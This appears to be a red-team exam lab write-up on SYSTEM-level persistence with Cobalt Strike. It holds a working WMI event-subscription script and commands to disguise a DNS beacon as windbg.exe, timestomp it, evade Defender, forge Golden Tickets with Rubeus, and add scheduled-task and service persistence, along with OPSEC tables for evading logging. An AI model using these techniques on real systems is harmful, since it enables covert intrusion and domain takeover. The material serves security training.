# Elevated Persistence Lab

> **Methodology context:** This is **Phase 7 — Elevated Persistence**. Deploy after you have a SYSTEM beacon (from Phase 6 Privilege Escalation). This is your second persistence layer — if the user-level COM hijack (Phase 4) is cleaned up by Blue Team, this WMI subscription brings you back without requiring a user to log in.

> **Where this fits in the exam attack chain:**
> ```
> Privilege Escalation (SYSTEM beacon)
>   → [THIS LAB] WMI event subscription (SYSTEM-level, triggers on GPO refresh)
>   → Credential Access → Lateral Movement → Domain Dominance
>
> Comparison with Phase 4 (user-level COM hijack):
>   Phase 4: HKCU registry, needs target user logged in, triggers when Teams starts
>   Phase 7: WMI repository, triggers on GPO refresh (gpupdate), no user interaction, survives reboots
> ```

> **Pre-lab checklist:**
> - [ ] SYSTEM beacon active (from BadWindowsService privesc or equivalent)
> - [ ] DNS listener configured and running in CS GUI (distinct from HTTP listener)
> - [ ] **`artifact.cna` loaded FIRST** — then generate dns_x64.exe (order matters — see note below)
> - [ ] `C:\Payloads\dns_x64.exe` generated (Payloads > Windows Stageless Payload > dns > exe)
> - [ ] `ThreatCheck.exe -f C:\Payloads\dns_x64.exe` → No threat found ✅ (confirms custom artifacts used)
> - [ ] `C:\Tools\WmiPersistence.ps1` exists on attacker desktop (pre-staged in course)
> - [ ] Malleable C2 profile active (`c2lint` passed) — DNS beacon must survive Defender
>
> **⚠️ Lab vs exam day difference:** In the course lab, the Elevated Persistence module inherits the Defence Evasion lab's pre-staged environment — `artifact.cna` is already loaded and the Malleable C2 profile is already active. On exam day **nothing is pre-staged**. You must complete Phase 0 (CS setup) and Phase 1 (Defence Evasion — Artifact Kit + profile) before generating any payload. A payload generated before `artifact.cna` is loaded uses default CS artifacts and will be flagged by Defender on disk write.
>
> **[2026-04-17] Lab-confirmed results (defence-evasion lab pre-staged):**
> - `ThreatCheck.exe -f C:\Tools\WmiPersistence.ps1` → No threat found (expected — PS1 has no payload bytes)
> - `ThreatCheck.exe -f C:\Payloads\dns_x64.exe` → No threat found (custom Artifact Kit confirmed active)
> - Malleable C2 profile confirmed loaded in CS client (stage + post-ex + process-inject blocks active)
> - Combined: full kill chain (disk → execution → memory) is covered against Defender

> **OPSEC classification:** `OPSEC-CAUTION` — WMI repository writes (not disk file), detected by Sysmon Event 19/20/21 and WMI-Activity Event 5861. No Event 7045 (no service). Payload binary `windbg.exe` is on disk — survives disk scan if Artifact Kit is clean. Disguise as Windows debugging tool to blend.

> **Why DNS beacon, not HTTP:**
> - DNS C2 traffic blends with normal DNS queries — harder to block without disrupting the network
> - HTTP listener may be rate-limited or inspected on port 80; DNS is rarely firewalled internally
> - The WMI trigger runs as SYSTEM in a headless context (no user session) — DNS survives where HTTP might fail in restricted environments
> - Exam pattern: DNS for elevated/SYSTEM persistence, HTTP/SMB for interactive beacons

---

## Part 1 — Generate DNS Payload

1. In Cobalt Strike GUI:
   - **Payloads > Windows Stageless Payload**
   - Listener: **dns**
   - Output: **Windows EXE (x64)**
   - Click **Generate**
   - Save to `C:\Payloads\dns_x64.exe`

> **Why EXE, not DLL:** The WMI CommandLineEventConsumer runs a command line directly (`windbg.exe -trace`) — it cannot load a DLL. The EXE is what gets executed.

---

## Part 2 — Upload and Disguise Payload

On the **SYSTEM beacon** (from Privilege Escalation):

```cs
// Check working directory — confirm SYSTEM context
beacon> getuid                              // should show NT AUTHORITY\SYSTEM
beacon> pwd                                // confirm working directory

// Upload to a path that looks legitimate
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe windbg.exe
```

> **Why `windbg.exe`:** Windows Debugger — a legitimate Microsoft tool. Defender and analysts are less likely to flag a binary named `windbg.exe` in a system path. Combined with the WMI consumer command line `windbg.exe -trace`, it reads as a debugging session.

> **OPSEC note:** The beacon EXE is still on disk — if Defender does a memory scan and you haven't built a clean Artifact Kit payload, it will be caught. Always build the DNS payload from your custom artifact.cna, not the default CS output.

> **[2026-04-17] ThreatCheck Observation — WmiPersistence.ps1**
> Running `ThreatCheck.exe -f C:\Tools\WmiPersistence.ps1` returns "No threat found" — **this is expected and does not mean the technique is undetected.**
> The PS1 contains no payload bytes, no shellcode, no encoded strings — only standard WMI management cmdlets (`Set-WmiInstance`, `Get-WMIObject`). Defender's AMSI engine has nothing to match. The threat is not inside the script; it's in what the script registers.
>
> **The file you must ThreatCheck is the payload EXE:**
> ```cmd
> ThreatCheck.exe -f "C:\Payloads\dns_x64.exe"
> ```
> If the EXE is flagged → rebuild Artifact Kit. If the EXE is clean → the PS1 result is irrelevant.
>
> **Remaining detection surface after a clean EXE:** Sysmon 19/20/21 and WMI-Activity Event 5861 fire on subscription creation regardless of AV. These are SIEM-level events (OPSEC score impact), not Defender AV blocks. The Malleable C2 profile (`userwx false`, `module_x64`, `copy_pe_header false`) covers the beacon's memory scan survival after the EXE executes.

---

## Part 3 — Install WMI Event Subscription

The persistence script (`WmiPersistence.ps1`) creates three WMI objects that form the subscription chain:

| WMI Object | Class | Name in Script | Purpose |
|-----------|-------|---------------|---------|
| Event Filter | `__EventFilter` | `Debug Trace` | WQL query — fires on Event ID 1502 (GPO refresh) |
| Event Consumer | `CommandLineEventConsumer` | `Debug Consumer` | Runs `windbg.exe -trace` when filter fires |
| Binding | `__FilterToConsumerBinding` | (links above two) | Connects filter → consumer |

**Install via `psinject`** (injects unmanaged PowerShell into the SYSTEM beacon process — no `powershell.exe` spawn):

```cs
beacon> powershell-import C:\Tools\WmiPersistence.ps1
beacon> psinject [BEACON PID] x64 Add-WmiPersistence
```

> **Why `psinject` not `powerpick`:**
> - `powerpick` = fork & run — spawns a sacrificial process, runs PS, returns output, kills process
> - `psinject [BEACON PID]` = injects unmanaged PowerShell *into the beacon's own process* — no separate child process created
> - For this particular task (setting WMI objects), `psinject` into the existing SYSTEM process avoids a detectable fork&run child

> **Why `powershell-import` first:** The CNA script (`WmiPersistence.ps1`) is not automatically available to `psinject`. `powershell-import` loads the script block into the beacon's PS runspace so `psinject` can call `Add-WmiPersistence` by name.

**OPSEC-CAUTION** — these events are logged:
- `WMI-Activity/Operational: Event 5861` — new permanent WMI subscription registered
- `Sysmon Event 19` — WMI filter creation
- `Sysmon Event 20` — WMI consumer creation  
- `Sysmon Event 21` — WMI filter-to-consumer binding

The object names `"Debug Trace"` and `"Debug Consumer"` are chosen to blend with legitimate WMI diagnostic activity.

---

## Part 4 — Verify Subscription Installed

```cs
// Enumerate WMI subscriptions (OPSEC-SAFE — powerpick, no child process)
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```

Expected output: three objects matching `Debug Trace`, `Debug Consumer`, and the binding.

---

## Part 5 — Trigger and Test

```cs
// Trigger GPO refresh to test persistence fires (OPSEC-CAUTION — spawns gpupdate.exe child process)
beacon> execute gpupdate /target:computer /force
```

> **`execute` vs `run`:** `execute` spawns the process but does not capture output. `run` captures output (via named pipe) but is also OPSEC-CAUTION. Either way it spawns `gpupdate.exe` as a child of the beacon process. Acceptable for testing — gpupdate runs legitimately all the time.

Switch to attacker desktop — a new **DNS beacon** should appear within a few seconds.

**Verify the DNS beacon:**
```cs
beacon> getuid          // confirm NT AUTHORITY\SYSTEM
beacon> process_browser // confirm beacon PID is inside windbg.exe (or the spawned process)
```

---

## Part 6 — Exam Day Notes

**Trigger condition:** WMI fires on `Win32_NTLogEvent` Event Code `1502` = Group Policy computer configuration refresh. This happens:
- Every 90 minutes automatically (domain policy refresh interval)
- When any user runs `gpupdate /force`
- On machine boot (policy applies during boot)

**You do not need to stay in the lab waiting.** Set the persistence and move on. The beacon will call back next time GP refreshes.

**If the DNS beacon doesn't appear immediately:**
```cs
// Force from any beacon on the same machine
beacon> execute gpupdate /target:computer /force
// Or wait — domain GP refresh fires every ~90 minutes automatically
```

**Verification (once DNS beacon checks in):**
```cs
beacon> getuid          // NT AUTHORITY\SYSTEM
beacon> process_browser // confirm process context
beacon> run klist       // confirm no stale Kerberos tickets in SYSTEM session
```

---

## Part 7 — Cleanup

Remove all three WMI objects — **all three must be removed or the subscription reassembles on next WMI evaluation**:

```cs
beacon> psinject [BEACON PID] x64 Remove-WmiPersistence
```

Or manually if the script is no longer loaded:
```cs
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject

// Remove payload binary
beacon> rm windbg.exe
```

---

## OPSEC Comparison — Elevated Persistence Options

| Technique | Admin needed | Disk artifact | Survives reboot | Detection | Exam preference |
|-----------|-------------|---------------|-----------------|-----------|-----------------|
| **WMI subscription** (this lab) | Yes (SYSTEM) | Payload EXE | Yes (WMI repo) | Event 5861, Sysmon 19-21 | **PRIMARY** |
| **Scheduled task (powerpick)** | Yes | Task XML in Tasks\ | Yes | Event 4698 | Backup option |
| **Golden Ticket** | Yes (DA) | None | Until krbtgt rotation | Event 4662 (DCSync only) | **Best for DA persistence** |
| **DPERSIST1 (Golden Cert)** | Yes (DA + ADCS) | None | Until CA cert expires | Cert enrollment event | Best if ADCS available |
| **Windows Service** | Yes | Service binary | Yes | **Event 7045** | LAST RESORT — avoid on exam |

### Golden Ticket — Best OPSEC Elevated Persistence (no binary on disk)

Once you have the `krbtgt` AES256 hash from DCSync, you can forge DA-level Kerberos tickets at will — no binary on disk, no WMI subscription, no scheduled task:

```cs
// On attacker desktop (NOT in beacon — run locally)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:contoso.com /sid:<domain-SID> /aes256:<krbtgt-aes256> /outfile:C:\Users\Attacker\Desktop\golden

// Inject into beacon session when needed
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN].kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$   // verify DA access
```

> **Why this is the best persistence:** No process runs on target machines. No file written to target. Ticket lives in the attacker's memory only. Survives until `krbtgt` password is rotated (default 60 days; detection is DCSync event 4662 at collection time, not at use time).

### Scheduled Task — Backup if WMI is Monitored

```cs
// OPSEC-CAUTION — task XML written to C:\Windows\System32\Tasks\, Event 4698
beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action $action -Trigger $trigger -RunLevel Highest -User 'SYSTEM' -Force

// Verify
beacon> powerpick Get-ScheduledTask -TaskName 'WindowsDebugHelper'

// Cleanup
beacon> powerpick Unregister-ScheduledTask -TaskName 'WindowsDebugHelper' -Confirm:$false
```

> **Avoid `shell schtasks /create`** — spawns `cmd.exe` as child of beacon (OPSEC-UNSAFE). Always use `powerpick` with the `ScheduledTask` cmdlets.

---

## WmiPersistence.ps1 — Full Script Reference

```powershell
function Add-WmiPersistence
{
   $EventFilterArgs = @{
      EventNamespace = 'root/cimv2'
      Name           = "Debug Trace"
      Query          = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
      QueryLanguage  = 'WQL'
   }
   $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

   $CommandLineConsumerArgs = @{
      Name                = "Debug Consumer"
      CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
   }
   $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

   $FilterToConsumerArgs = @{
      Filter   = $Filter
      Consumer = $Consumer
   }
   Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
}

function Remove-WmiPersistence
{
    Get-WMIObject -Namespace root/Subscription -Class __EventFilter         -Filter "Name='Debug Trace'"    | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
}
```

**Key WQL trigger explained:**
- `__InstanceCreationEvent` — fires when a new WMI instance is created (e.g., a new log event entry)
- `WITHIN 5` — polling interval in seconds (WMI checks every 5 seconds)
- `Win32_NTLogEvent` — monitors the Windows Event Log
- `EventCode = '1502'` — Group Policy computer configuration successfully applied

> **Swapping the trigger for exam flexibility:** If 1502 doesn't fire, change to `EventCode = '6013'` (System Uptime — fires on every reboot) or `EventCode = '4624'` (successful logon — fires when any user logs in).

---

## Command Alternatives — OPSEC Comparison

> Use this section on exam day to pick the safest command for each operation. Every row shows the same task done at three risk levels. **Green = use this. Red = avoid.**

### Installing WMI Persistence

| Risk | Command | Why |
|------|---------|-----|
| `OPSEC-CAUTION` ✅ | `powershell-import C:\Tools\WmiPersistence.ps1` then `psinject [BEACON PID] x64 Add-WmiPersistence` | No `powershell.exe` spawn. Unmanaged PS runs inside beacon's own process. **Lab method — use this.** |
| `OPSEC-CAUTION` ✅ | `powerpick Set-WmiInstance -Namespace root/subscription ...` (inline, three separate calls) | Fork & run — spawns spawnto process, but no `powershell.exe`. Use if WmiPersistence.ps1 unavailable. |
| `OPSEC-UNSAFE` ❌ | `shell powershell.exe -ExecutionPolicy Bypass -File C:\Tools\WmiPersistence.ps1` | Spawns `cmd.exe` then `powershell.exe` — two child processes, command line visible to Defender and SIEM. Never use. |

### Verifying Persistence

| Risk | Command | Why |
|------|---------|-----|
| `OPSEC-CAUTION` ✅ | `powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter` | Unmanaged PS in spawnto process. No `powershell.exe`. |
| `OPSEC-UNSAFE` ❌ | `shell wmic /namespace:\\root\subscription path __EventFilter get Name` | Spawns `cmd.exe` + `wmic.exe`. WMIC is deprecated and heavily monitored. |
| `OPSEC-UNSAFE` ❌ | `shell powershell Get-WmiObject ...` | Spawns `cmd.exe` + `powershell.exe`. |

### Triggering (Test Only)

| Risk | Command | Why |
|------|---------|-----|
| `OPSEC-CAUTION` ✅ | `execute gpupdate /target:computer /force` | Spawns `gpupdate.exe` directly (no `cmd.exe` intermediary). Legitimate process, runs constantly in domain environments. Output not captured. |
| `OPSEC-CAUTION` ✅ | `run gpupdate /target:computer /force` | Same as above but captures output via named pipe. Slightly noisier (pipe creation) but still acceptable. |
| `OPSEC-UNSAFE` ❌ | `shell gpupdate /target:computer /force` | Spawns `cmd.exe` first, then `gpupdate.exe`. Extra child process visible in tree. |

### Uploading and Renaming Payload

| Risk | Command | Why |
|------|---------|-----|
| `OPSEC-SAFE` ✅ | `upload C:\Payloads\dns_x64.exe` then `mv dns_x64.exe windbg.exe` | Built-in beacon commands — no child process, no command-line artifact. |
| `OPSEC-SAFE` ✅ | `timestomp windbg.exe <legitimate-file>` | Copies timestamps from a legitimate file — reduces forensic suspicion on the EXE. Do this after `mv`. |
| `OPSEC-UNSAFE` ❌ | `shell copy C:\Payloads\dns_x64.exe C:\Windows\System32\windbg.exe` | Spawns `cmd.exe`. Unnecessary — built-in upload/mv do this without a child process. |

### Cleanup — Removing WMI Subscription

| Risk | Command | Why |
|------|---------|-----|
| `OPSEC-CAUTION` ✅ | `psinject [BEACON PID] x64 Remove-WmiPersistence` | Mirror of install method — uses same psinject, no child process. |
| `OPSEC-CAUTION` ✅ | `powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='Debug Trace'" \| Remove-WmiObject` | No `powershell.exe`. Slightly noisier than psinject (fork & run) but clean. |
| `OPSEC-UNSAFE` ❌ | `shell wmic /namespace:\\root\subscription path __EventFilter where "Name='Debug Trace'" delete` | Spawns `cmd.exe` + `wmic.exe`. WMIC process creation logged. |

### Scheduled Task (Backup Persistence)

| Risk | Command | Why |
|------|---------|-----|
| `OPSEC-CAUTION` ✅ | `powerpick Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action (New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) -RunLevel Highest -User 'SYSTEM' -Force` | No `powershell.exe`. Task XML written to disk (always — unavoidable), Event 4698 fires. |
| `OPSEC-CAUTION` ✅ | `execute-assembly SharPersist.exe -t schtask -c "C:\Windows\Temp\windbg.exe" -n "WindowsDebugHelper" -m add -o logon` | Fork & run (spawnto process). Same Event 4698 detection as above but no `powershell.exe`. |
| `OPSEC-UNSAFE` ❌ | `shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\windbg.exe" /sc onstart /ru SYSTEM /f` | Spawns `cmd.exe` + `schtasks.exe`. Command line logged by Defender kernel callbacks. |

### Service Creation (Last Resort Only)

| Risk | Command | Why |
|------|---------|-----|
| `OPSEC-CAUTION` ✅ | `execute-assembly SharPersist.exe -t service -c "C:\Windows\Temp\beacon.exe" -n "WindowsUpdateHelper" -m add` | **Event 7045 still fires** — no avoiding it for service creation. SharPersist avoids the extra `cmd.exe` spawn at least. |
| `OPSEC-UNSAFE` ❌ | `shell sc create "SvcUpdate" binpath= "C:\Windows\Temp\beacon.exe" start= auto` | Spawns `cmd.exe` + `sc.exe`. Event 7045 + child process chain. |
| `OPSEC-UNSAFE` ❌ | `shell sc start "SvcUpdate"` | Same — `cmd.exe` child. Use `execute sc start SvcUpdate` if you must (no output capture, no cmd.exe). |

---

> **Exam rule:** If the operation has a `powerpick` equivalent, always use `powerpick` over `shell`. If it has an `execute-assembly` equivalent, prefer that over `shell`. Only fall back to `shell` when there is genuinely no alternative — and flag it as UNSAFE in your documentation for the OPSEC scoring criteria.
